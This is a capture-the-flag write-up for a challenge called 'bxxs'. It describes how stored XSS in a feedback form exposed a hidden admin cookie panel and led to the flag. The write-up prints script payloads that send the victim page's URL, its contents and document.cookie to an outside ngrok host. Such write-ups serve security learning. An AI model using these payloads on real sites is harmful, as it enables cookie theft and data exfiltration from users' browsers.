<hr />

<h2>description: XSS leads to information leakage of hidden endpoint and authentication bypass.</h2>

<h1>bxxs</h1>

<h2>Problem</h2>

<p>We've made some new epic updates to our website. Could you send us some feedback on it?</p>

<h2>Solution</h2>

<p>We are given an endpoint that allows us to "Send a feedback to admin". I tried submitting URLs but these had no effect.</p>

<p><img src="../../.gitbook/assets/image (7) (1).png" alt="" /></p>

<p>Later, I found that we could submit arbitrary HTML that would be rendered by the admin's browser. This could be verified by submitting the following and catching the HTTP request:</p>

<p>```markup</p>

<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/"; </script>

<p>```</p>

<p>It is then trivial to obtain more information from the victim's browser.</p>

<p>We still don't know how exactly our submitted HTML is handled. Where is it rendered and in what context? To answer that question, I tried the following payload to get the page URL, contents and cookie.</p>

<p>```markup</p>

<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?url=" + escape(window.location.href); </script>

<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?doc=" + escape(document.body.innerHTML); </script>

<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?cookie=" + escape(document.cookie); </script>

<p>```</p>

<p><code>window.location.href</code> gives us the full URL of the browsing context, <code>document.body.innerHTML</code> gives us the page contents, and <code>document.cookie</code> gives us any cookies that could be read by JavaScript (those without the HttpOnly flag set).</p>

<p>From the output, it appeared that:</p>

<ul>
<li>The page URL is <code>http://0.0.0.0/Secret_admin_cookie_panel</code></li>
<li>Our submitted HTML was the only content present on the page.</li>
<li>JavaScript could not read any cookies.</li>
</ul>

<p>My teammate rainbowpigeon then visited the <code>/Secret_admin_cookie_panel</code> endpoint and found that this page returned a <code>Set-Cookie</code> header for a new cookie with the HttpOnly flag set. This was the "admin cookie" we needed.</p>

<p><img src="../../.gitbook/assets/image (5).png" alt="" /></p>

<p>My teammate lim_yj found that there is a <code>/flag</code> endpoint, previously inaccessible without the appropriate cookie.</p>

<p>Visiting the page again with the admin cookie set gives us the flag.</p>

<p><img src="../../.gitbook/assets/image (6) (1).png" alt="" /></p>
